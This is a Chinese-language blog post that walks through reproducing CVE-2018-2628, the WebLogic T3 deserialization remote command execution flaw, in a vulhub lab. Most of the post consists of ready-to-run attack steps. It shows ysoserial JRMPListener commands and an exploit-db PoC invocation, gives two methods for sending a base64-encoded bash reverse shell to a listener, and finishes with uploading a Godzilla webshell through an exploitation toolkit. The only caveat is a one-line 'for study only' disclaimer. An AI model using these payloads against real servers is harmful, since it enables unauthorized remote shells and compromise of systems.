# CVE-2018-2628 Weblogic WLS Core Components 反序列化命令执行漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15728602.html`](https://www.cnblogs.com/peace-and-romance/p/15728602.html)

### 0X00-引言

* * *

今晚路灯很亮，好像上面少个人

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞介绍

* * *

Oracle 2018 年 4 月补丁中，修复了 Weblogic Server WLS Core Components 中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过 t3 协议触发，可导致未授权的用户在远程服务器执行任意命令。

影响版本：

```
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.2
Weblogic 12.2.1.3 
```

### 0X03-漏洞复现

* * *

##### 01-使用 ysoserial 开启 JRMP 服务

下载 ysoserial(0.0.6 版的也可以)：[`github.com/frohoff/ysoserial`](https://github.com/frohoff/ysoserial)

```
java -cp ysoserial-0.0.5-all.jar ysoserial.exploit.JRMPListener 端口号 CommonsCollections1 "执行的命令" 
```

![image-20211223144831186](img/8b76160d79f724f9af339109da2a53b0.png)

##### 02-运行 POC

POC 下载：[`www.exploit-db.com/exploits/44553`](https://www.exploit-db.com/exploits/44553)

```
python cve-2018-2628.py 192.168.234.128 7001 ./ysoserial-0.0.5-all.jar 192.168.234.135 1099 JRMPClient 
```

![image-20211223145203558](img/628818583ac2fde29034e18ce268e12e.png)

开启的 JRMP 服务会接受到消息

![image-20211223145246244](img/fb59bbc511c2e03cfea3fc7f0f558ea0.png)

到镜像里面查看是否创建 flag.txt 文件

```
docker exec -it 镜像 ID /bin/sh  #进入镜像 
```

![image-20211223145633576](img/e9d240ba8a7ed040bf63711e3f9aa3fc.png)

##### 03-反弹 shell

###### 01-第一种方法

由于 Runtime.getRuntime().exec() 中不能使用管道符等 bash 需要的方法，需要进行一次编码。

shell 命令编码：[`www.jackson-t.ca/runtime-exec-payloads.html`](https://www.jackson-t.ca/runtime-exec-payloads.html)

![image-20211224114426193](img/04bcdf6bd31c19f32b0b1188c956685e.png)

```
java -cp ysoserial-0.0.5-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMzUvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}"  #开启 JRMP 服务
nc -lvvp 1234  #监听
python cve-2018-2628.py 192.168.234.128 7001 ./ysoserial-0.0.5-all.jar 192.168.234.135 1099 JRMPClient  #运行脚本 
```

成功反弹

![image-20211224114658895](img/264df247da218183c90d063863e2324d.png)

###### 02-第二种方法

下载工具包(另一种方法)：[`github.com/Lighird/CVE-2018-2628`](https://github.com/Lighird/CVE-2018-2628)

![image-20211224114426193](img/04bcdf6bd31c19f32b0b1188c956685e.png)

```
java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener 8888 Jdk7u21 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMzUvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}' 
```

![image-20211224115235179](img/759fe89acde613683eaced6195d30db1.png)

```
java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient2 192.168.234.135:8888 | xxd -p | tr -d $'\n' && echo 
```

![image-20211224115439307](img/278b963527963952363b38700009e1e8.png)

复制结果-替换 weblogic_poc.py 中的 payload

![image-20211224115756859](img/f1fb19a1447f44e5d35a327359f64a53.png)

![image-20211224115841601](img/fa369f5860608899f05d9e4a16eaa373.png)

运行脚本(python2)-成功反弹 shell

![image-20211224120520557](img/58994b2d76062542972fc3fb65c193af.png)

### 0X04-工具检测

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

##### 01-测试

![image-20211223150645386](img/70fa3a9d853a0c717acb3a0917a7fea1.png)

![image-20211223150703822](img/4c4b75ff45e1e8f094f6a497bb8704cc.png)

##### 02-上传文件 getshell

上传的是哥斯拉生成的马

![image-20211223153509802](img/960107aacd9e18d7e63e5ad15dd870ec.png)

![image-20211223153602098](img/d28a16d622da920915e02c458cab4dc8.png)

![image-20211223153653843](img/5ebce0cb6dc075b4323dfc44f38476ca.png)

### 0X05-免责声明

* * *

仅供学习使用

### 0X06-参考

* * *

[解决 ubuntu crontab 反弹 shell 失败的问题](https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/)

[weblogic cve-2018-2628 复现](https://blog.csdn.net/sojrs_sec/article/details/103684445)

[`vulhub.org/#/environments/weblogic/CVE-2018-2628/`](https://vulhub.org/#/environments/weblogic/CVE-2018-2628/)

[`blog.csdn.net/xuandao_ahfengren/article/details/106597145`](https://blog.csdn.net/xuandao_ahfengren/article/details/106597145)

[`blog.csdn.net/whatday/article/details/107720033`](https://blog.csdn.net/whatday/article/details/107720033)